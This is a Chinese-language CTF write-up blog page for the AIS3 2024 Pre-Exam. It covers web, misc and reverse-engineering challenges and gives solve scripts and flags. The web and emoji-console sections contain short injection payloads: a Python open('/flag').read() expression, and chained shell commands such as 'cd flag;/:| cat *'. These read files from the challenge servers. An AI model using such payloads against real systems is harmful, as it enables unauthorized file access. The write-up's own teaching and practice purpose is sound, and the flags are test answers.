@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans+TC:300,300italic,400,400italic,700,700italic%7CUbuntu:300,300italic,400,400italic,700,700italic%7CRoboto+Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/black/pace-theme-loading-bar.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"pierre0210.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.20.0","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜尋...","empty":"我們無法找到任何有關 ${query} 的搜索結果","hits_time":"${hits} 找到 ${time} 個結果","hits":"找到 ${hits} 個結果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="AIS3 2024 Pre-Exam 解題記錄">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AIS3 2024 Pre-Exam Writeup">
+<meta property="og:url" content="https://pierre0210.github.io/2024/06/08/ais3-pre-exam-2024/index.html">
+<meta property="og:site_name" content="Pierre的踩坑筆記">
+<meta property="og:description" content="AIS3 2024 Pre-Exam 解題記錄">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://pierre0210.github.io/decompile.png">
+<meta property="og:image" content="https://pierre0210.github.io/gcode.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJG5pGMV0.png">
+<meta property="article:published_time" content="2024-06-08T12:43:15.000Z">
+<meta property="article:modified_time" content="2024-06-08T12:45:22.688Z">
+<meta property="article:author" content="Pierre">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pierre0210.github.io/decompile.png">
+
+
+<link rel="canonical" href="https://pierre0210.github.io/2024/06/08/ais3-pre-exam-2024/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-TW","comments":true,"permalink":"https://pierre0210.github.io/2024/06/08/ais3-pre-exam-2024/","path":"2024/06/08/ais3-pre-exam-2024/","title":"AIS3 2024 Pre-Exam Writeup"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>AIS3 2024 Pre-Exam Writeup | Pierre的踩坑筆記</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Pierre的踩坑筆記" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切換導航欄" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Pierre的踩坑筆記</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Web development / CTF</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜尋" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首頁</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>標籤</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分類</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目錄
+        </li>
+        <li class="sidebar-nav-overview">
+          本站概要
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Evil-Calculator"><span class="nav-number">1.1.</span> <span class="nav-text">Evil Calculator</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">2.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Three-Dimensional-Secret"><span class="nav-number">2.1.</span> <span class="nav-text">Three Dimensional Secret</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Emoji-Console"><span class="nav-number">2.2.</span> <span class="nav-text">Emoji Console</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">3.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#The-Long-Print"><span class="nav-number">3.1.</span> <span class="nav-text">The Long Print</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%81%AB%E6%8B%B3%E3%81%AE%E3%82%A8%E3%83%BC%E3%82%B9"><span class="nav-number">3.2.</span> <span class="nav-text">火拳のエース</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Pierre"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Pierre</p>
+  <div class="site-description" itemprop="description">(╯°Д°)╯ ┻━┻</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分類</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">標籤</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/pierre0210" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;pierre0210" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:gamelauncher0210@gmail.com" title="E-Mail → mailto:gamelauncher0210@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/pierre_0210" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;pierre_0210" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml" rel="noopener me"><i class="fa fa-rss fa-fw"></i></a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-TW">
+    <link itemprop="mainEntityOfPage" href="https://pierre0210.github.io/2024/06/08/ais3-pre-exam-2024/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Pierre">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pierre的踩坑筆記">
+      <meta itemprop="description" content="(╯°Д°)╯ ┻━┻">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="AIS3 2024 Pre-Exam Writeup | Pierre的踩坑筆記">
+      <meta itemprop="description" content="AIS3 2024 Pre-Exam 解題記錄">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          AIS3 2024 Pre-Exam Writeup
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">發表於</span>
+
+      <time title="創建時間：2024-06-08 20:43:15" itemprop="dateCreated datePublished" datetime="2024-06-08T20:43:15+08:00">2024-06-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分類於</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%AF%94%E8%B3%BD/" itemprop="url" rel="index"><span itemprop="name">比賽</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">AIS3 2024 Pre-Exam 解題記錄</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Evil-Calculator"><a href="#Evil-Calculator" class="headerlink" title="Evil Calculator"></a>Evil Calculator</h3><p>後端只有擋空格與底線使用open function即可bypass</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl --header <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  --request POST \</span><br><span class="line">  --data <span class="string">&quot;@payload&quot;</span> \</span><br><span class="line">  http://chals1.ais3.org:5001/calculate</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span> <span class="string">&quot;open(&#x27;/flag&#x27;).read()&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>flag: <code>AIS3&#123;7RiANG13_5NAK3_I5_50_3Vi1&#125;</code></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Three-Dimensional-Secret"><a href="#Three-Dimensional-Secret" class="headerlink" title="Three Dimensional Secret"></a>Three Dimensional Secret</h3><p>pcapng檔後段有給3DP用的Marlin G-code<br>丟給Cura或Online G-code Viewer會得到如下圖之結果</p>
+<p><img src="/./decompile.png" alt="image"><br>flag: <code>AIS3&#123;b4d1y_tun3d_PriN73r&#125;</code></p>
+<h3 id="Emoji-Console"><a href="#Emoji-Console" class="headerlink" title="Emoji Console"></a>Emoji Console</h3><p>每一個emoji對應一組符號 利用🐱 ⭐可組合出<code>cat *</code>將後端原始碼印出<br>搭配對照表利用💿 🚩😓😑 🐱 ⭐湊成<code>cd flag;/:| cat *</code>輸出<code>flag-printer.py</code></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#flag-printer.py</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read())</span><br></pre></td></tr></table></figure>
+
+<p>將後半段替換成🐍 ⭐(<code>cd flag;/:| python *</code>) 🉐 flag<br>flag: <code>AIS3&#123;🫵🪡🉐🤙🤙🤙👉👉🚩👈👈&#125;</code></p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="The-Long-Print"><a href="#The-Long-Print" class="headerlink" title="The Long Print"></a>The Long Print</h3><p>依照decompile的結果去除delay的部分照寫一遍即可解出flag</p>
+<p><img src="/./gcode.png" alt="image"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">secret = <span class="string">b&#x27;\x46\x41\x4b\x45\x0b\x00\x00\x00\x7b\x68\x6f\x6f\x0a\x00\x00\x00\x72\x61\x79\x5f\x02\x00\x00\x00\x73\x74\x72\x69\x08\x00\x00\x00\x6e\x67\x73\x5f\x06\x00\x00\x00\x69\x73\x5f\x61\x05\x00\x00\x00\x6c\x77\x61\x79\x07\x00\x00\x00\x73\x5f\x61\x6e\x04\x00\x00\x00\x5f\x75\x73\x65\x09\x00\x00\x00\x66\x75\x6c\x5f\x00\x00\x00\x00\x63\x6f\x6d\x6d\x01\x00\x00\x00\x61\x6e\x7a\x7d\x03\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;\x01\x10\x01\x3a\x0d\x1b\x4c\x4c\x2d\x00\x0b\x3a\x40\x4f\x45\x00\x1a\x32\x04\x31\x1d\x16\x2d\x3e\x31\x0a\x12\x2c\x03\x11\x3e\x0d\x2c\x00\x1a\x0c\x32\x14\x1d\x04\x00\x31\x00\x1a\x07\x08\x18&#x27;</span></span><br><span class="line"></span><br><span class="line">secret_list = []</span><br><span class="line">key_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(secret), <span class="number">4</span>):</span><br><span class="line">    secret_list.append(<span class="built_in">int</span>.from_bytes(secret[i:i+<span class="number">4</span>], <span class="string">&quot;little&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(key), <span class="number">4</span>):</span><br><span class="line">    key_list.append(<span class="built_in">int</span>.from_bytes(key[i:i+<span class="number">4</span>], <span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">mask = (<span class="number">1</span> &lt;&lt; <span class="number">8</span>) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">24</span>, <span class="number">2</span>):</span><br><span class="line">    chunk = key_list[secret_list[i+<span class="number">1</span>]] ^ secret_list[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        flag += <span class="built_in">chr</span>((chunk &gt;&gt; (j * <span class="number">8</span>)) &amp; mask)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<p>flag: <code>AISE&#123;You_are_the_master_of_time_management!!!!?&#125;</code></p>
+<h3 id="火拳のエース"><a href="#火拳のエース" class="headerlink" title="火拳のエース"></a>火拳のエース</h3><p>輸入字串在經過<code>xor_strings</code> function後讓每個buffer的字元用以下<code>complex_function</code>內的運算進行處理後再與設定之密文進行比較</p>
+<p><img src="https://hackmd.io/_uploads/BJG5pGMV0.png" alt="image"></p>
+<p>可利用z3求解如下所示</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">index = []</span><br><span class="line">index.append([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line">index.append([i + <span class="number">0x20</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line">index.append([i + <span class="number">0x40</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line">index.append([i + <span class="number">0x60</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line">key.append(<span class="string">b&#x27;\x0e\x0d\x7d\x06\x0f\x17\x76\x04&#x27;</span>)</span><br><span class="line">key.append(<span class="string">b&#x27;\x6d\x00\x1b\x7c\x6c\x13\x62\x11&#x27;</span>)</span><br><span class="line">key.append(<span class="string">b&#x27;\x1e\x7e\x06\x13\x07\x66\x0e\x71&#x27;</span>)</span><br><span class="line">key.append(<span class="string">b&#x27;\x17\x14\x1d\x70\x79\x67\x74\x33&#x27;</span>)</span><br><span class="line"></span><br><span class="line">secret = []</span><br><span class="line">secret.append(<span class="string">&quot;DHLIYJEG&quot;</span>)</span><br><span class="line">secret.append(<span class="string">&quot;MZRERYND&quot;</span>)</span><br><span class="line">secret.append(<span class="string">&quot;RUYODBAH&quot;</span>)</span><br><span class="line">secret.append(<span class="string">&quot;BKEMPBRE&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ind, k, sec <span class="keyword">in</span> <span class="built_in">zip</span>(index, key, secret):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(sec):</span><br><span class="line">        x = Int(<span class="string">&quot;x&quot;</span>)</span><br><span class="line">        s = Solver()</span><br><span class="line">        s.add(x &gt; <span class="number">0x40</span>, x &lt; <span class="number">0x5b</span>)</span><br><span class="line">        offset = <span class="built_in">ord</span>(c) - <span class="number">0x41</span></span><br><span class="line">        ivar = ind[i] % <span class="number">3</span> + <span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> ind[i] % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">            s.add((((x - <span class="number">0x41</span> + ind[i] * <span class="number">0x11</span>) % <span class="number">0x1a</span>) * ivar + <span class="number">7</span>) % \</span><br><span class="line">                  <span class="number">0x1a</span> == offset)</span><br><span class="line">        <span class="keyword">elif</span> ind[i] % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">            s.add((ivar * <span class="number">2</span> + ((x - <span class="number">0x41</span> + ind[i] * <span class="number">0x11</span>) % <span class="number">0x1a</span>)) % \</span><br><span class="line">                  <span class="number">0x1a</span> == offset)</span><br><span class="line">        <span class="keyword">elif</span> ind[i] % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">            s.add(((((x - <span class="number">0x41</span> + ind[i] * <span class="number">0x11</span>) % <span class="number">0x1a</span>) - ivar) + <span class="number">0x1a</span>) % \</span><br><span class="line">                  <span class="number">0x1a</span> == offset)</span><br><span class="line">        s.check()</span><br><span class="line">        m = s.model()</span><br><span class="line">        result.append(m[x].as_long())</span><br><span class="line">        <span class="comment"># print(m[x].as_long())</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i, r <span class="keyword">in</span> <span class="built_in">enumerate</span>(result):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(k[i] ^ r), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>flag: <code>AIS3&#123;G0D_D4MN_4N9R_15_5UP3R_P0W3RFU1!!!&#125;</code></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/03/31/rcnn/" rel="prev" title="R-CNN Note">
+                  <i class="fa fa-angle-left"></i> R-CNN Note
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-code-commit"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Pierre</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 強力驅動
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="回到頂端">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script size="200" alpha="0.5" zIndex="-1" src="https://cdnjs.cloudflare.com/ajax/libs/ribbon.js/1.0.2/ribbon.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
